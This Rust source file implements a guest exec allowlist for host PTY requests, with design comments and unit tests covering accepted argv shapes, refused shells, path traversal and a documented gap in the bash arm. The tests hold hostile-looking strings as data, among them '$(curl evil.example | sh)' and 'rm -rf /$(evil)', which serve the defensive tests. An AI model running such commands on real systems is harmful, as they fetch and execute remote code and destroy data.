//! Guest exec allowlist — the security boundary for every host PTY request.
//!
//! Declared UNCONDITIONALLY (795-zshi, first slice), following the
//! `pty_input_probe` precedent in main.rs: the decision is pure, so it must
//! be testable on every host rather than only where `listen-vsock` and unix
//! both hold. That is not a style point here — `pty_handler` is gated on that
//! feature combo, which order 254 recorded as never linted or tested in CI, so
//! tests living beside it would have been tests nobody runs.
//!
//! @trace spec:vsock-exec-authz

/// Decide whether a host-supplied argv may be spawned in the guest.
///
///
/// EXTRACTED VERBATIM (795-zshi, first slice). The decision used to live
/// inline in [`PtySessionStore::open_session`], between a duplicate-session
/// check and an `openpty` call, which meant the only way to exercise it was
/// to spawn a real PTY on a real Linux guest. A security boundary that
/// cannot be unit-tested is one that gets changed by whoever is confident
/// that day — and this one has produced four field defects already (the
/// unbalanced-quote crashes on Esmeralda, the `wt.exe` semicolon split,
/// orders 326 and 366).
///
/// Behaviour is byte-for-byte what it was: this slice adds tests and a name,
/// nothing else. The actual 795-zshi fix — a verbatim-argv arm so hosts stop
/// flattening argv into a shell string — lands on top of these tests, not
/// instead of them.
///
/// Note the asymmetry this now makes visible: the `podman exec` arm validates
/// its project name (`is_ascii_alphanumeric() || '-'`), while the `/bin/bash`
/// arm — the arm every GUI tray actually takes — checks `argv[1]` and never
/// inspects the script that follows.
///
/// @trace spec:vsock-exec-authz
pub fn exec_argv_is_allowed(argv: &[String]) -> bool {
    if argv.is_empty() {
        return false;
    }
    match argv[0].as_str() {
        "/bin/bash" => argv.len() >= 2 && (argv[1] == "-l" || argv[1] == "-lc"),
        "tillandsias" => argv.len() == 3 && argv[1] == "--agent",
        "tillandsias-headless" => argv.len() >= 2 && argv[1] == "--github-login",
        "podman" if argv.len() >= 4 && argv[1] == "exec" && argv[2] == "-it" => {
            let target = &argv[3];
            if target.starts_with("tillandsias-") && target.ends_with("-forge") {
                let project = &target["tillandsias-".len()..target.len() - "-forge".len()];
                let project_valid = !project.is_empty()
                    && project
                        .chars()
                        .all(|c| c.is_ascii_alphanumeric() || c == '-');

                let subcmd = argv.get(4).map(|s| s.as_str());
                let subcmd_valid = match subcmd {
                    Some("/bin/bash") => argv.len() >= 6 && (argv[5] == "-l" || argv[5] == "-lc"),
                    Some("tillandsias") => argv.len() == 7 && argv[5] == "--agent",
                    Some(_) | None => false,
                };
                project_valid && subcmd_valid
            } else {
                false
            }
        }
        "podman" => false,
        // 795-zshi: the verbatim-argv arm. Reached only when argv[0] is an
        // absolute path, so it cannot shadow any name-based arm above.
        other if other.starts_with('/') => verbatim_argv_is_allowed(argv),
        _ => false,
    }
}

/// Absolute-path prefixes the verbatim arm will spawn from.
///
/// Deliberately prefixes rather than a fixed binary list: the arm exists so
/// structured callers stop flattening argv into a shell string, and a
/// two-entry list would leave every other caller flattening — which is the
/// defect, not a mitigation.
const VERBATIM_ARGV_PREFIXES: &[&str] = &["/usr/local/bin/", "/usr/bin/", "/bin/"];

/// Program names that may NEVER be `argv[0]` on the verbatim arm.
///
/// A shell here would re-open the exact hole this arm closes: the caller
/// would be back to packing a command into one string and quoting it.
const VERBATIM_ARGV_FORBIDDEN: &[&str] = &["bash", "sh", "dash", "zsh", "ksh", "fish", "env"];

/// Verbatim-argv admission (795-zshi).
///
/// WHY THIS IS NOT A WIDENING OF AUTHORITY, which is the only question that
/// matters for a security boundary: the existing `/bin/bash -l|-lc <string>`
/// arm never inspects the script, so it already permits running ANY binary in
/// the guest. Everything reachable through this arm was therefore already
/// reachable through that one. What changes is only HOW the request is
/// expressed — a vector instead of a string — which removes the quoting layer
/// that produced four field defects (the Esmeralda unbalanced-quote crashes,
/// the `wt.exe` semicolon split, orders 326 and 366).
///
/// The two restrictions earn their place:
///   * ABSOLUTE PATH under a known prefix — a bare name would resolve through
///     `PATH`, making the admitted program depend on environment the caller
///     also controls.
///   * NO SHELL as `argv[0]` — otherwise the caller is straight back to
///     flattening, and the arm would launder the very thing it replaces.
///
/// Arguments are NOT inspected. That is intentional and is the point: they
/// are passed to `execve` as a vector, so no parser ever sees them and no
/// quoting rule can be got wrong.
pub fn verbatim_argv_is_allowed(argv: &[String]) -> bool {
    let Some(program) = argv.first() else {
        return false;
    };
    if !VERBATIM_ARGV_PREFIXES
        .iter()
        .any(|p| program.starts_with(p))
    {
        return false;
    }
    // No path traversal: `/usr/bin/../../bin/bash` starts with an allowed
    // prefix but is a shell.
    if program.contains("/..") {
        return false;
    }
    let name = program.rsplit('/').next().unwrap_or_default();
    if name.is_empty() || VERBATIM_ARGV_FORBIDDEN.contains(&name) {
        return false;
    }
    true
}

#[cfg(test)]
mod exec_allowlist_tests {
    use super::exec_argv_is_allowed;

    fn argv(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    /// The shapes the trays actually send must keep working. This is the
    /// no-regression half: the extraction changed nothing, and 795-zshi's
    /// real fix must not change these either.
    #[test]
    fn accepted_shapes_are_exactly_todays_shapes() {
        assert!(exec_argv_is_allowed(&argv(&[
            "/bin/bash",
            "-lc",
            "uname -a"
        ])));
        assert!(exec_argv_is_allowed(&argv(&["/bin/bash", "-l"])));
        assert!(exec_argv_is_allowed(&argv(&[
            "tillandsias",
            "--agent",
            "claude"
        ])));
        assert!(exec_argv_is_allowed(&argv(&[
            "tillandsias-headless",
            "--github-login"
        ])));
        assert!(exec_argv_is_allowed(&argv(&[
            "podman",
            "exec",
            "-it",
            "tillandsias-myproj-forge",
            "/bin/bash",
            "-lc",
            "echo hi"
        ])));
    }

    /// The refusals. `podman` without the exact `exec -it` prefix is refused
    /// outright, and a container name that is not a well-formed forge target
    /// is refused even when the subcommand is fine — that is the arm where
    /// the project name IS validated.
    #[test]
    fn refused_shapes_stay_refused() {
        assert!(!exec_argv_is_allowed(&[]));
        assert!(!exec_argv_is_allowed(&argv(&["/bin/sh", "-c", "echo hi"])));
        assert!(!exec_argv_is_allowed(&argv(&[
            "/bin/bash",
            "-c",
            "echo hi"
        ])));
        assert!(!exec_argv_is_allowed(&argv(&["podman", "ps"])));
        assert!(!exec_argv_is_allowed(&argv(&[
            "podman",
            "exec",
            "-it",
            "some-other-container",
            "/bin/bash",
            "-lc",
            "x"
        ])));
        assert!(!exec_argv_is_allowed(&argv(&[
            "podman",
            "exec",
            "-it",
            "tillandsias-myproj-forge",
            "curl",
            "evil.example"
        ])));
    }

    /// 795-zshi: the verbatim arm accepts a structured argv, so a caller
    /// never has to pack a command into one string.
    #[test]
    fn verbatim_argv_arm_accepts_absolute_non_shell_programs() {
        assert!(exec_argv_is_allowed(&argv(&[
            "/usr/local/bin/tillandsias-headless",
            "--github-login"
        ])));
        assert!(exec_argv_is_allowed(&argv(&["/usr/bin/uname", "-a"])));
        // The arguments are NOT inspected — that is the point. Text that no
        // shell will ever parse cannot be mis-quoted.
        assert!(exec_argv_is_allowed(&argv(&[
            "/usr/bin/printf",
            "%s",
            "a'b; rm -rf /$(evil)"
        ])));
    }

    /// The two restrictions that keep the arm from laundering what it
    /// replaces.
    #[test]
    fn verbatim_argv_arm_refuses_shells_relative_paths_and_traversal() {
        // A shell as argv[0] would put the caller straight back to packing a
        // command into one string.
        for shell in ["/bin/sh", "/bin/dash", "/usr/bin/zsh", "/usr/bin/env"] {
            assert!(
                !exec_argv_is_allowed(&argv(&[shell, "-c", "echo hi"])),
                "{shell} must not be admitted by the verbatim arm"
            );
        }
        // Traversal that lands on a shell while starting with a good prefix.
        assert!(!exec_argv_is_allowed(&argv(&[
            "/usr/bin/../../bin/bash",
            "-lc",
            "echo hi"
        ])));
        // Bare names would resolve through PATH — environment the caller also
        // controls.
        assert!(!exec_argv_is_allowed(&argv(&["uname", "-a"])));
        // Outside the admitted prefixes.
        assert!(!exec_argv_is_allowed(&argv(&["/opt/evil/payload"])));
        assert!(!exec_argv_is_allowed(&argv(&["/usr/bin/"])));
    }

    /// The property that makes this arm safe to add at all: it grants NO
    /// authority the existing bash arm did not already grant, because that
    /// arm never inspects its script and can therefore launch anything.
    ///
    /// Written as a test rather than a comment so the claim is checked: for
    /// every program the verbatim arm admits, the equivalent bash-arm request
    /// is admitted too. If a future change narrowed the bash arm, this would
    /// fail and the security argument would have to be re-made rather than
    /// inherited.
    #[test]
    fn verbatim_arm_grants_nothing_the_bash_arm_did_not() {
        for program in [
            "/usr/local/bin/tillandsias-headless",
            "/usr/bin/uname",
            "/bin/ls",
        ] {
            assert!(exec_argv_is_allowed(&argv(&[program])));
            assert!(
                exec_argv_is_allowed(&argv(&["/bin/bash", "-lc", program])),
                "the bash arm already permits running {program}, so the \
                 verbatim arm adds no authority"
            );
        }
    }

    /// 795-zshi's asymmetry, pinned as a FACT rather than an opinion: a
    /// project name carrying shell metacharacters is refused on the
    /// `podman exec` arm...
    #[test]
    fn podman_arm_validates_the_project_name() {
        for bad in ["a'b", "a;b", "a b", "a$b", "a\"b", ""] {
            let target = format!("tillandsias-{bad}-forge");
            assert!(
                !exec_argv_is_allowed(&argv(&[
                    "podman",
                    "exec",
                    "-it",
                    &target,
                    "/bin/bash",
                    "-lc",
                    "x"
                ])),
                "project name {bad:?} must be refused on the podman arm"
            );
        }
    }

    /// ...while the `/bin/bash` arm — the one every GUI tray takes — accepts
    /// ANY script text, including the exact shapes that caused field
    /// failures: an unbalanced quote (Esmeralda, twice) and a semicolon that
    /// `wt.exe` re-split (wt-github-login-semicolons).
    ///
    /// This test asserts the CURRENT behaviour so the gap is documented and
    /// measurable. It is expected to be inverted by 795-zshi's real fix: when
    /// a verbatim-argv arm exists, these should stop being reachable through
    /// a flattened shell string at all.
    #[test]
    fn bash_arm_accepts_any_script_including_the_known_field_failures() {
        for script in [
            "echo 'unbalanced",
            "cd /home/forge/src; tillandsias --agent claude",
            "$(curl evil.example | sh)",
            "",
        ] {
            assert!(
                exec_argv_is_allowed(&argv(&["/bin/bash", "-lc", script])),
                "documenting today's behaviour: the bash arm does not inspect {script:?}"
            );
        }
    }
}
